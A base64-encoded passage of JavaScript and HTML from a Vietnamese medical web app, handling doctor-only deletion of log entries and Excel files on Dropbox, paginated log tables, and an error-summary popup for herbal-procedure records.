ZXh0PSdC4bqhbiBjw7MgY2jhuq9jIG114buRbiB4b8OhPycsIG9uZUJ1dHRvbj1mYWxzZSkgew0KICByZXR1cm4gbmV3IFByb21pc2UocmVzb2x2ZSA9PiB7DQogICAgY29uc3Qgb3ZlcmxheSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICAgIE9iamVjdC5hc3NpZ24ob3ZlcmxheS5zdHlsZSwgew0KICAgICAgcG9zaXRpb246J2ZpeGVkJywgaW5zZXQ6JzAnLCBiYWNrZ3JvdW5kOidyZ2JhKDAsMCwwLDAuNSknLA0KICAgICAgZGlzcGxheTonZmxleCcsIGFsaWduSXRlbXM6J2NlbnRlcicsIGp1c3RpZnlDb250ZW50OidjZW50ZXInLCB6SW5kZXg6MTAwMDENCiAgICB9KTsNCg0KICAgIGNvbnN0IGJveCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICAgIE9iamVjdC5hc3NpZ24oYm94LnN0eWxlLCB7DQogICAgICBiYWNrZ3JvdW5kOicjZmZmJywgcGFkZGluZzonMjBweCcsIGJvcmRlclJhZGl1czonOHB4JywNCiAgICAgIG1heFdpZHRoOic0MjBweCcsIHdpZHRoOic5MCUnLCBib3hTaGFkb3c6JzAgNHB4IDEycHggcmdiYSgwLDAsMCwuMjUpJywNCiAgICAgIGZvbnRGYW1pbHk6J0ludGVyLCBzYW5zLXNlcmlmJw0KICAgIH0pOw0KDQogICAgYm94LmlubmVySFRNTCA9IGANCiAgICAgIDxkaXYgc3R5bGU9ImZvbnQtd2VpZ2h0OjYwMDsgbWFyZ2luLWJvdHRvbTo4cHgiPljDoWMgbmjhuq1uIHhvw6E8L2Rpdj4NCiAgICAgIDxkaXYgc3R5bGU9Im1hcmdpbi1ib3R0b206MTRweCI+JHt0ZXh0fTwvZGl2Pg0KICAgICAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4OyBnYXA6MTBweDsganVzdGlmeS1jb250ZW50OmZsZXgtZW5kIj4NCiAgICAgICAgPGJ1dHRvbiBpZD0iZGxnQ2FuY2VsIiBjbGFzcz0iYnRuIiBzdHlsZT0iYmFja2dyb3VuZDojN2Y4YzhkIj5IdeG7tzwvYnV0dG9uPg0KICAgICAgICAkeyFvbmVCdXR0b24gPyBgPGJ1dHRvbiBpZD0iZGxnWWVzIiBjbGFzcz0iYnRuIiBzdHlsZT0iYmFja2dyb3VuZDojZTc0YzNjIj5Yb8OhPC9idXR0b24+YCA6ICcnfQ0KICAgICAgPC9kaXY+DQogICAgYDsNCg0KICAgIG92ZXJsYXkuYXBwZW5kQ2hpbGQoYm94KTsNCiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKG92ZXJsYXkpOw0KDQogICAgYm94LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZSA9PiBlLnN0b3BQcm9wYWdhdGlvbigpKTsNCiAgICBvdmVybGF5LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4geyBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKG92ZXJsYXkpOyByZXNvbHZlKGZhbHNlKTsgfSk7DQogICAgYm94LnF1ZXJ5U2VsZWN0b3IoJyNkbGdDYW5jZWwnKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChvdmVybGF5KTsgcmVzb2x2ZShmYWxzZSk7IH0pOw0KDQogICAgaWYgKCFvbmVCdXR0b24pIHsNCiAgICAgIGJveC5xdWVyeVNlbGVjdG9yKCcjZGxnWWVzJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7IGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQob3ZlcmxheSk7IHJlc29sdmUodHJ1ZSk7IH0pOw0KICAgIH0NCiAgfSk7DQp9DQoNCi8vIFhvw6EgMSBlbnRyeSBsb2cgKyBmaWxlIEV4Y2VsIHRyw6puIERyb3Bib3ggKHRoZW8gaW5kZXggdHJvbmcgbeG6o25nIGxvZ3MpDQphc3luYyBmdW5jdGlvbiBkZWxldGVMb2dBbmRGaWxlX0J5SW5kZXgoaWR4KSB7DQogIGNvbnN0IGFjY2Vzc1Rva2VuID0gYXdhaXQgZ2V0QWNjZXNzVG9rZW4oKTsNCiAgY29uc3QgZGJ4ID0gbmV3IERyb3Bib3guRHJvcGJveCh7IGFjY2Vzc1Rva2VuIH0pOw0KICBjb25zdCBsb2dQYXRoID0gJy90aHV0aHVhdC9sb2cuanNvbic7DQoNCiAgLy8gMSkgVOG6o2kgbG9nLmpzb24gaGnhu4duIHThuqFpDQogIGxldCBsb2dzID0gW107DQogIHRyeSB7DQogICAgY29uc3QgZGwgPSBhd2FpdCBkYnguZmlsZXNEb3dubG9hZCh7IHBhdGg6IGxvZ1BhdGggfSk7DQogICAgY29uc3QgdGV4dCA9IGF3YWl0IGRsLnJlc3VsdC5maWxlQmxvYi50ZXh0KCk7DQogICAgbG9ncyA9IEpTT04ucGFyc2UodGV4dCB8fCAnW10nKTsNCiAgfSBjYXRjaCAoZSkgew0KICAgIGFsZXJ0KCdLaMO0bmcgxJHhu41jIMSRxrDhu6NjIGxvZy5qc29uIHRyw6puIERyb3Bib3guJyk7IA0KICAgIHRocm93IGU7DQogIH0NCg0KICBjb25zdCBpdGVtID0gbG9nc1tpZHhdOw0KICBpZiAoIWl0ZW0pIHsgYWxlcnQoJ0tow7RuZyB0w6xtIHRo4bqleSBt4bulYyBj4bqnbiB4b8OhLicpOyByZXR1cm47IH0NCg0KICAvLyAyKSBM4bqleSBmaWxlTmFtZSAmIHhvw6EgZmlsZSBFeGNlbCAobuG6v3UgY8OzKQ0KICBjb25zdCBmaWxlTmFtZSA9IGV4dHJhY3RGaWxlbmFtZShpdGVtLmxpbmsgfHwgJycpOw0KICBjb25zdCBmaWxlUGF0aCA9IGZpbGVOYW1lID8gYC90aHV0aHVhdC8ke2ZpbGVOYW1lfWAgOiBudWxsOw0KDQogIHRyeSB7DQogICAgaWYgKGZpbGVQYXRoKSB7IGF3YWl0IGRieC5maWxlc0RlbGV0ZVYyKHsgcGF0aDogZmlsZVBhdGggfSk7IH0NCiAgfSBjYXRjaCAoZSkgew0KICAgIC8vIE7hur91IGZpbGUga2jDtG5nIHThu5NuIHThuqFpIHbhuqtuIHRp4bq/cCB04bulYyB4b8OhIGxvZw0KICAgIGNvbnNvbGUud2FybignWG/DoSBmaWxlIEV4Y2VsIGzhu5dpL2tow7RuZyB04buTbiB04bqhaSwgdGnhur9wIHThu6VjIHhvw6EgbG9nLi4uJywgZSk7DQogIH0NCg0KICAvLyAzKSBD4bqtcCBuaOG6rXQgbG9nOiBi4buPIHBo4bqnbiB04butIGlkeCB2w6AgZ2hpIMSRw6ggbOG6oWkNCiAgbG9ncy5zcGxpY2UoaWR4LCAxKTsNCiAgYXdhaXQgZGJ4LmZpbGVzVXBsb2FkKHsNCiAgICBwYXRoOiBsb2dQYXRoLA0KICAgIGNvbnRlbnRzOiBKU09OLnN0cmluZ2lmeShsb2dzLCBudWxsLCAyKSwNCiAgICBtb2RlOiB7ICcudGFnJzogJ292ZXJ3cml0ZScgfSwNCiAgICBhdXRvcmVuYW1lOiBmYWxzZQ0KICB9KTsNCn0NCg0KDQphc3luYyBmdW5jdGlvbiBvbkRlbGV0ZUxvZ1JvdyhpbmRleEluTG9ncywgY3VycmVudFVzZXIpIHsNCiAgLy8gTuG6v3Uga2jDtG5nIHBo4bqjaSBkb2N0b3Ig4oaSIHBvcHVwIGPhuqVtIHhvw6EsIGNo4buJIGPDsyAxIG7DunQgSHXhu7cNCiAgaWYgKGN1cnJlbnRVc2VyICE9PSAnZG9jdG9yJykgew0KICAgIGF3YWl0IGNvbmZpcm1EZWxldGVQb3B1cCgNCiAgICAgICfinYwgw4ogbMOgbSBjw6FpIGfDrCDEkeG6pXl5eXkgZW0gxqFpLiA8YnIvPkThu6tuZyBs4bqhaSBuZ2F5LCBxdcOhIG5ndXkgaGnhu4NtLicsDQogICAgICB0cnVlIC8vIDwtLSBjaOG6vyDEkeG7mSAxIG7DunQNCiAgICApOw0KICAgIHJldHVybjsNCiAgfQ0KDQogIC8vIE7hur91IGzDoCBkb2N0b3Ig4oaSIHBvcHVwIHjDoWMgbmjhuq1uIHhvw6EgKDIgbsO6dCkNCiAgY29uc3Qgb2sgPSBhd2FpdCBjb25maXJtRGVsZXRlUG9wdXAoDQogICAgJ0LhuqFuIGPDsyBjaOG6r2MgbXXhu5FuIHhvw6EgbeG7pWMgbsOgeT8nLA0KICAgIGZhbHNlDQogICk7DQogIGlmICghb2spIHJldHVybjsNCg0KICB0cnkgew0KICAgIGF3YWl0IGRlbGV0ZUxvZ0FuZEZpbGVfQnlJbmRleChpbmRleEluTG9ncyk7DQogICAgYXdhaXQgY29uZmlybURlbGV0ZVBvcHVwKCfinIUgxJDDoyB4b8OhIHRow6BuaCBjw7RuZyEnLCB0cnVlKTsNCiAgICBhd2FpdCBzaG93RHJvcGJveFBhbmVsKCk7DQogIH0gY2F0Y2ggKGUpIHsNCiAgICBjb25zb2xlLmVycm9yKGUpOw0KICAgIGF3YWl0IGNvbmZpcm1EZWxldGVQb3B1cCgn4pqg77iPIEPDsyBs4buXaSBraGkgeG/DoS4gVnVpIGzDsm5nIHRo4butIGzhuqFpLicsIHRydWUpOw0KICB9DQp9DQoNCi8vIMSQw7NuZyBwYW5lbCBraGkgYuG6pW0gRVNDIGhv4bq3YyBjbGljayByYSBuZ2/DoGkNCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleWRvd24iLCBmdW5jdGlvbihlKSB7DQogIGlmIChlLmtleSA9PT0gIkVzY2FwZSIpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZHJvcGJveFBhbmVsIikuc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgfQ0KfSk7DQoNCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oZSkgew0KICBjb25zdCBwYW5lbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkcm9wYm94UGFuZWwiKTsNCiAgaWYgKHBhbmVsLnN0eWxlLmRpc3BsYXkgPT09ICJibG9jayIgfHwgcGFuZWwuc3R5bGUuZGlzcGxheSA9PT0gImZsZXgiKSB7DQogICAgY29uc3QgY29udGVudCA9IHBhbmVsLnF1ZXJ5U2VsZWN0b3IoImRpdiIpOw0KICAgIC8vIE7hur91IGNsaWNrIG5nb8OgaSB2w7luZyBu4buZaSBkdW5nIHBhbmVsDQogICAgaWYgKCFjb250ZW50LmNvbnRhaW5zKGUudGFyZ2V0KSkgew0KICAgICAgcGFuZWwuc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgICB9DQogIH0NCn0pOw0KDQo8L3NjcmlwdD4NCjxzY3JpcHQ+DQovLyA9PT09PT0gUEjDgk4gVFJBTkcgQuG6ok5HIExPRyBUUk9ORyBQT1BVUCA9PT09PT0NCmxldCBEQl9MT0dTID0gW107ICAgICAgIC8vIHRvw6BuIGLhu5kgbG9ncyDEkcOjIHThuqNpDQpsZXQgREJfUEFHRSA9IDE7ICAgICAgICAvLyB0cmFuZyBoaeG7h24gdOG6oWkNCmxldCBEQl9QQUdFX1NJWkUgPSAxMDsgIC8vIHPhu5EgZMOybmcgLyB0cmFuZw0KbGV0IERCX0NVUlJFTlRfVVNFUiA9ICcnOyAvLyB1c2VyIMSRYW5nIMSRxINuZyBuaOG6rXAgKGxvd2VyY2FzZSkgxJHhu4MgcmVuZGVyIG7DunQgWG/DoQ0KDQpmdW5jdGlvbiBzZXRQYWdlU2l6ZShzaXplKXsNCiAgREJfUEFHRV9TSVpFID0gTnVtYmVyKHNpemUpIHx8IDEwOw0KICBEQl9QQUdFID0gMTsNCiAgcmVuZGVyRHJvcGJveFBhZ2UoKTsNCn0NCg0KZnVuY3Rpb24gZ29Ub1BhZ2UocCl7DQogIGNvbnN0IG1heCA9IE1hdGgubWF4KDEsIE1hdGguY2VpbChEQl9MT0dTLmxlbmd0aCAvIERCX1BBR0VfU0laRSkpOw0KICBEQl9QQUdFID0gTWF0aC5taW4oTWF0aC5tYXgoMSwgcCksIG1heCk7DQogIHJlbmRlckRyb3Bib3hQYWdlKCk7DQp9DQoNCmZ1bmN0aW9uIHJlbmRlckRyb3Bib3hQYWdlKCl7DQogIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hGaWxlTGlzdCcpOw0KICBjb25zdCBwYWdlQnRucyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94UGFnZUJ1dHRvbnMnKTsNCiAgY29uc3QgcGFnZUluZm8gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhZ2VJbmZvJyk7DQoNCiAgaWYoIXRib2R5KSByZXR1cm47DQoNCiAgLy8gcuG7l25nPw0KICBpZighQXJyYXkuaXNBcnJheShEQl9MT0dTKSB8fCBEQl9MT0dTLmxlbmd0aCA9PT0gMCl7DQogICAgdGJvZHkuaW5uZXJIVE1MID0gYDx0cj48dGQgY29sc3Bhbj0iNiIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyO2NvbG9yOnJlZCI+S2jDtG5nIGPDsyBkYW5oIHPDoWNoIG7DoG8gxJHGsOG7o2MgbMawdTwvdGQ+PC90cj5gOw0KICAgIGlmKHBhZ2VCdG5zKSBwYWdlQnRucy5pbm5lckhUTUwgPSAnJzsNCiAgICBpZihwYWdlSW5mbykgcGFnZUluZm8udGV4dENvbnRlbnQgPSAnJzsNCiAgICByZXR1cm47DQogIH0NCg0KICBjb25zdCB0b3RhbCA9IERCX0xPR1MubGVuZ3RoOw0KICBjb25zdCBtYXhQYWdlID0gTWF0aC5tYXgoMSwgTWF0aC5jZWlsKHRvdGFsIC8gREJfUEFHRV9TSVpFKSk7DQogIGlmKERCX1BBR0UgPiBtYXhQYWdlKSBEQl9QQUdFID0gbWF4UGFnZTsNCg0KICBjb25zdCBzdGFydElkeCA9IChEQl9QQUdFIC0gMSkgKiBEQl9QQUdFX1NJWkU7DQogIGNvbnN0IGVuZElkeCAgID0gTWF0aC5taW4oc3RhcnRJZHggKyBEQl9QQUdFX1NJWkUsIHRvdGFsKTsNCiAgY29uc3Qgc2xpY2UgICAgPSBEQl9MT0dTLnNsaWNlKHN0YXJ0SWR4LCBlbmRJZHgpOw0KDQogIC8vIFJlbmRlciBib2R5IHRoZW8gdHJhbmcNCiAgdGJvZHkuaW5uZXJIVE1MID0gc2xpY2UubWFwKChpdGVtLCBpKSA9PiBgDQogICAgPHRyPg0KICAgICAgPHRkPiR7c3RhcnRJZHggKyBpICsgMX08L3RkPg0KICAgICAgPHRkPiR7aXRlbS5raG9hIHx8ICcnfTwvdGQ+DQogICAgICA8dGQ+JHsoaXRlbS5uZ2F5IHx8ICcnKQ0KICAgICAgICAgICAucmVwbGFjZSgnMDA6MDA6MDAnLCcnKQ0KICAgICAgICAgICAucmVwbGFjZSgnMjM6NTk6NTknLCcnKQ0KICAgICAgICAgICAucmVwbGFjZSgnVOG7qycsJycpDQogICAgICAgICAgIC5yZXBsYWNlKCfEkeG6v24nLCcgLT4gJykNCiAgICAgICAgICAgLnJlcGxhY2UoL1xzKy9nLCcgJykNCiAgICAgICAgICAgLnRyaW0oKX08L3RkPg0KCQkgICANCgkJICAgPHRkPiR7TnVtYmVyKGl0ZW0uaGVyYl9lcnJvcnMgfHwgMCl9PC90ZD4NCiAgICAgPHRkPiR7TnVtYmVyKGl0ZW0udGltZV9lcnJvcnMgfHwgMCl9PC90ZD4NCiAgICA8dGQ+JHtOdW1iZXIoaXRlbS5jb25mbGljdF9lcnJvcnMgfHwgMCl9PC90ZD4NCgkJICAgDQogICAgICA8dGQ+JHsoaXRlbS50aW1lIHx8ICcnKQ0KICAgICAgICAgICAucmVwbGFjZSgnLCcsICcnKQ0KICAgICAgICAgICAucmVwbGFjZSgnICcsICcgLSAnKQ0KICAgICAgICAgICAucmVwbGFjZSgvXHMrL2csICcgJykNCiAgICAgICAgICAgLnRyaW0oKX08L3RkPg0KICAgICAgPHRkPjxhIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgb25jbGljaz0idmVyaWZ5QW5kT3BlbkxpbmsoJyR7aXRlbS5saW5rfScpIj5YZW08L2E+PC90ZD4NCiAgICAgIDx0ZD4NCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBzdHlsZT0iYmFja2dyb3VuZDojZTc0YzNjOyBwYWRkaW5nOjEwcHggMTRweDsgZm9udC1zaXplOjEycHg7Ig0KICAgICAgICAgIG9uY2xpY2s9Im9uRGVsZXRlTG9nUm93KCR7c3RhcnRJZHggKyBpfSwgJyR7REJfQ1VSUkVOVF9VU0VSfScpIj4NCiAgICAgICAgICA8aSBjbGFzcz0iZmEgZmEtdHJhc2giPjwvaT4gWG/DoQ0KICAgICAgICA8L2J1dHRvbj4NCiAgICAgIDwvdGQ+DQogICAgPC90cj4NCiAgYCkuam9pbignJyk7DQoNCiAgLy8gUmVuZGVyIG7DunQgdHJhbmcgKFByZXYg4oCmIE5leHQpIOKAlCBoaeG7g24gdGjhu4sgZOG6o2kgdOG7kWkgxJFhIDcgbsO6dCBz4buRDQogIGlmKHBhZ2VCdG5zKXsNCiAgICBjb25zdCBidG4gPSAobGFiZWwsIHRhcmdldCwgZGlzYWJsZWQ9ZmFsc2UsIHRpdGxlPScnKSA9Pg0KICAgICAgYDxidXR0b24gY2xhc3M9ImJ0biIgJHtkaXNhYmxlZD8nZGlzYWJsZWQnOicnfSB0aXRsZT0iJHt0aXRsZX0iDQogICAgICAgICAgICAgICBzdHlsZT0icGFkZGluZzo2cHggMTBweCR7ZGlzYWJsZWQ/JztvcGFjaXR5Oi42O2N1cnNvcjpub3QtYWxsb3dlZCc6Jyd9Ig0KICAgICAgICAgICAgICAgb25jbGljaz0iZ29Ub1BhZ2UoJHt0YXJnZXR9KSI+JHtsYWJlbH08L2J1dHRvbj5gOw0KDQogICAgY29uc3QgcmFuZ2UgPSAzOyAvLyBoYWkgYsOqbiB0cmFuZyBoaeG7h24gdOG6oWkNCiAgICBjb25zdCBmcm9tICA9IE1hdGgubWF4KDEsIERCX1BBR0UgLSByYW5nZSk7DQogICAgY29uc3QgdG8gICAgPSBNYXRoLm1pbihtYXhQYWdlLCBEQl9QQUdFICsgcmFuZ2UpOw0KDQogICAgbGV0IGh0bWwgPSAnJzsNCiAgICBodG1sICs9IGJ0bignwqsgxJDhuqd1JywgMSwgREJfUEFHRT09PTEsICdUcmFuZyDEkeG6p3UnKTsNCiAgICBodG1sICs9IGJ0bign4oC5IFRyxrDhu5tjJywgREJfUEFHRS0xLCBEQl9QQUdFPT09MSwgJ1RyYW5nIHRyxrDhu5tjJyk7DQogICAgZm9yKGxldCBwID0gZnJvbTsgcCA8PSB0bzsgcCsrKXsNCiAgICAgIGh0bWwgKz0gYDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iZ29Ub1BhZ2UoJHtwfSkiDQogICAgICAgICAgICAgICAgIHN0eWxlPSJwYWRkaW5nOjZweCAxMHB4OyR7cD09PURCX1BBR0U/J2JhY2tncm91bmQ6IzJlY2M3MSc6Jyd9Ij4NCiAgICAgICAgICAgICAgICAgJHtwfQ0KICAgICAgICAgICAgICAgPC9idXR0b24+YDsNCiAgICB9DQogICAgaHRtbCArPSBidG4oJ1NhdSDigLonLCBEQl9QQUdFKzEsIERCX1BBR0U9PT1tYXhQYWdlLCAnVHJhbmcgc2F1Jyk7DQogICAgaHRtbCArPSBidG4oJ0N14buRaSDCuycsIG1heFBhZ2UsIERCX1BBR0U9PT1tYXhQYWdlLCAnVHJhbmcgY3Xhu5FpJyk7DQoNCiAgICBwYWdlQnRucy5pbm5lckhUTUwgPSBodG1sOw0KICB9DQoNCiAgaWYocGFnZUluZm8pew0KICAgIHBhZ2VJbmZvLnRleHRDb250ZW50ID0gYFRyYW5nICR7REJfUEFHRX0vJHttYXhQYWdlfSDigKIgJHtzdGFydElkeCsxfS0ke2VuZElkeH0vJHt0b3RhbH1gOw0KICB9DQp9DQoNCi8vIEfhuq9uIHPhu7Ega2nhu4duIMSR4buVaSBwYWdlIHNpemUgKGNo4buJIGPhuqduIGfhu41pIDEgbOG6p24gc2F1IGtoaSBwb3B1cCBt4bufKQ0KZnVuY3Rpb24gYXR0YWNoUGFnZXJFdmVudHNPbmNlKCl7DQogIGNvbnN0IHNlbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94UGFnZVNpemUnKTsNCiAgaWYoc2VsICYmICFzZWwuZGF0YXNldC5ib3VuZCl7DQogICAgc2VsLmRhdGFzZXQuYm91bmQgPSAnMSc7DQogICAgc2VsLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGUgPT4gc2V0UGFnZVNpemUoZS50YXJnZXQudmFsdWUpKTsNCiAgfQ0KfQ0KPC9zY3JpcHQ+DQoNCg0KPCEtLSBQT1BVUCBUw5NNIFThuq5UIEzhu5ZJIC0tPg0KPGRpdiBpZD0ic3VtbWFyeU1vZGFsIiBzdHlsZT0iZGlzcGxheTpub25lO3Bvc2l0aW9uOmZpeGVkO2luc2V0OjA7ei1pbmRleDoxMTA1MCI+DQogIDxkaXYgaWQ9InN1bW1hcnlCYWNrZHJvcCIgc3R5bGU9InBvc2l0aW9uOmFic29sdXRlO2luc2V0OjA7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNSkiPjwvZGl2Pg0KICA8ZGl2IHJvbGU9ImRpYWxvZyIgYXJpYS1tb2RhbD0idHJ1ZSINCiAgICAgICBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7dG9wOjYlO2xlZnQ6NTAlO3RyYW5zZm9ybTp0cmFuc2xhdGVYKC01MCUpOw0KICAgICAgICAgICAgICB3aWR0aDptaW4oOTAwcHgsOTJ2dyk7bWF4LWhlaWdodDo4NnZoO292ZXJmbG93OmF1dG87DQogICAgICAgICAgICAgIGJhY2tncm91bmQ6I2ZmZjtjb2xvcjojMDAwO2JvcmRlci1yYWRpdXM6MTBweDtib3JkZXI6MnB4IHNvbGlkICMzNDk4ZGI7DQogICAgICAgICAgICAgIGJveC1zaGFkb3c6MCA4cHggMjRweCByZ2JhKDAsMCwwLC4yNSk7Zm9udC1mYW1pbHk6SW50ZXIsc2Fucy1zZXJpZiI+DQogICAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtqdXN0aWZ5LWNvbnRlbnQ6c3BhY2UtYmV0d2VlbjtwYWRkaW5nOjE0cHggMTZweDtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZTVlN2ViIj4NCiAgICAgIDxoMyBzdHlsZT0ibWFyZ2luOjA7Zm9udC1zaXplOjE4cHgiPlTDs20gVOG6r3QgTOG7l2k8L2gzPg0KICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiB0eXBlPSJidXR0b24iIGlkPSJzdW1tYXJ5Q2xvc2VCdG4iPsSQw7NuZzwvYnV0dG9uPg0KICAgIDwvZGl2Pg0KICAgIDxkaXYgaWQ9InN1bW1hcnlDb250ZW50IiBzdHlsZT0icGFkZGluZzoxNnB4IDE4cHg7Zm9udC1zaXplOjE0cHg7bGluZS1oZWlnaHQ6MS41Ij48L2Rpdj4NCiAgPC9kaXY+DQo8L2Rpdj4NCjxzY3JpcHQ+DQovLyA9PT09PSBUw5NNIFThuq5UIEzhu5ZJIChT4bqvYyB0aHXhu5FjIC8gU2FpIHRo4budaSBnaWFuIC8gVHLDuW5nIGdp4budKSA9PT09PQ0KKGZ1bmN0aW9uKCl7DQogIC8vIENodeG6qW4gaG/DoSB0w6puIGhp4buDbiB0aOG7iw0KICBmdW5jdGlvbiBjbGVhbihzKXsgcmV0dXJuIChzfHwnJykudG9TdHJpbmcoKS5yZXBsYWNlKC8sL2csJycpLnJlcGxhY2UoL1xzKy9nLCcgJykudHJpbSgpOyB9DQoNCiAgLy8gR29tIG5ow7NtOiB7IFtkb2N0b3JdOiB7IHRvdGFsOiBudW1iZXIsIGJ5T3BlcmF0b3I6IE1hcDxvcCwgY291bnQ+IH0gfQ0KICBmdW5jdGlvbiBtYWtlQnVja2V0KCl7IHJldHVybiB7IHRvdGFsOjAsIGJ5T3BlcmF0b3I6bmV3IE1hcCgpIH07IH0NCiBmdW5jdGlvbiBidW1wKGJ1Y2tldE1hcCwgZG9jdG9yLCBvcGVyYXRvcil7DQogIGNvbnN0IGQgPSAoZG9jdG9yfHwnJykudG9TdHJpbmcoKS5yZXBsYWNlKC8sL2csJycpLnRyaW0oKSB8fCAnS2jDtG5nIGPDsyc7DQogIGNvbnN0IG8gPSAob3BlcmF0b3J8fCcnKS50b1N0cmluZygpLnJlcGxhY2UoLywvZywnJykudHJpbSgpIHx8ICdLaMO0bmcgY8OzJzsNCiAgaWYoIWJ1Y2tldE1hcC5oYXMoZCkpIGJ1Y2tldE1hcC5zZXQoZCwgeyB0b3RhbDowLCBieU9wZXJhdG9yOm5ldyBNYXAoKSB9KTsNCiAgY29uc3QgYiA9IGJ1Y2tldE1hcC5nZXQoZCk7DQogIGIudG90YWwrKzsNCiAgYi5ieU9wZXJhdG9yLnNldChvLCAoYi5ieU9wZXJhdG9yLmdldChvKXx8MCkrMSk7DQp9DQoNCiAgLy8gMSkgxJDhur9tIFPhuq5DIFRIVeG7kEMgVEhBTkcNCmZ1bmN0aW9uIGNvdW50SGVyYigpew0KICBjb25zdCBoZXJicyA9IEFycmF5LmlzQXJyYXkod2luZG93LmFsbEhlcmJQcm9jZWR1cmVzKSA/IHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyA6IFtdOw0KICBjb25zdCBub3JtID0gcyA9PiAoc3x8JycpLnRvU3RyaW5nKCkucmVwbGFjZSgvWyzvvIxdK1xzKiQvLCcnKS5yZXBsYWNlKC9ccysvZywnICcpLnRyaW0oKS50b0xvd2VyQ2FzZSgpOw0KDQogIC8vIDEpIMSQ4bq/bSB04bqnbiBzdeG6pXQgbmfGsOG7nWkgdGjhu7FjIGhp4buHbiB0aGVvIHThu6tuZyBuZ8OgeQ0KICBjb25zdCBieURhdGUgPSBPYmplY3QuY3JlYXRlKG51bGwpOw0KICBoZXJicy5mb3JFYWNoKGg9PnsNCiAgICBjb25zdCBkID0gaC5kYXRlOw0KICAgIGNvbnN0IG9wID0gbm9ybShoLm9wZXJhdG9yKTsNCiAgICBpZighb3AgfHwgb3AgPT09ICdraMO0bmcgY8OzJykgcmV0dXJuOyAgICAgICAgICAgIC8vIGLhu48gdHLhu5FuZy9raMO0bmcgY8OzDQogICAgKGJ5RGF0ZVtkXXx8KGJ5RGF0ZVtkXT1PYmplY3QuY3JlYXRlKG51bGwpKSlbb3BdID0gKGJ5RGF0ZVtkXVtvcF18fDApICsgMTsNCiAgfSk7DQoNCiAgLy8gMikgVMOtbmggIsSRYSBz4buRIiAodG9wIHBo4bqjaSBs4bubbiBoxqFuIHNlY29uZCkNCiAgY29uc3QgbWFqb3JpdHkgPSBPYmplY3QuY3JlYXRlKG51bGwpOw0KICBPYmplY3Qua2V5cyhieURhdGUpLmZvckVhY2goZD0+ew0KICAgIGNvbnN0IGFyciA9IE9iamVjdC5lbnRyaWVzKGJ5RGF0ZVtkXSkuc29ydCgoYSxiKT0+YlsxXS1hWzFdKTsNCiAgICBjb25zdCB0b3AgICAgPSBhcnJbMF0gfHwgW251bGwsMF07DQogICAgY29uc3Qgc2Vjb25kID0gYXJyWzFdIHx8IFtudWxsLDBdOw0KICAgIG1ham9yaXR5W2RdID0geyB0b3A6IHRvcFswXSwgdG9wQ291bnQ6IHRvcFsxXSwgc2Vjb25kQ291bnQ6IHNlY29uZFsxXSB9Ow0KICB9KTsNCg0KICAvLyAzKSBDaOG7iSBj4buZbmcgbmjhu69uZyBjYSBLSMOBQyDEkEEgU+G7kCwgZ29tIHRoZW8gQsOhYyBzxKkgY2jhu4kgxJHhu4tuaCAoY8OieSBjaMOtbmgpDQogIGNvbnN0IG1hcCA9IG5ldyBNYXAoKTsgLy8geyBkb2N0b3IgPT4ge3RvdGFsLCBieU9wZXJhdG9yfSB9ICAoYnlPcGVyYXRvciBz4bq9IGtow7RuZyBoaeG7g24gdGjhu4spDQogIGhlcmJzLmZvckVhY2goaD0+ew0KICAgIGNvbnN0IGQgPSBoLmRhdGU7DQogICAgY29uc3Qgb3AgPSBub3JtKGgub3BlcmF0b3IpOw0KICAgIGlmKCFvcCB8fCBvcCA9PT0gJ2tow7RuZyBjw7MnKSByZXR1cm47DQogICAgY29uc3QgbSA9IG1ham9yaXR5W2RdOw0KICAgIGlmKCFtKSByZXR1cm47DQogICAgaWYobS50b3AgJiYgbS50b3BDb3VudCA+IG0uc2Vjb25kQ291bnQgJiYgb3AgIT09IG0udG9wKXsNCiAgICAgIC8vIGNo4buJIHTDrW5oIHRoZW8gYsOhYyBzxKkgY2jhu4kgxJHhu4tuaCAoY8OieSBjaMOtbmgpDQogICAgICBidW1wKG1hcCwgaC5kb2N0b3IsICcnKTsgIC8vICdieU9wZXJhdG9yJyBz4bq9IGLhu4sg4bqpbiDhu58gcGjhuqduIHJlbmRlcg0KICAgIH0NCiAgfSk7DQoNCiAgcmV0dXJuIG1hcDsNCn0NCg0KICAvLyAyKSDEkOG6v20gU0FJIFRI4bucSSBHSUFOICht4buNaSBs4buXaSB0cm9uZyBlcn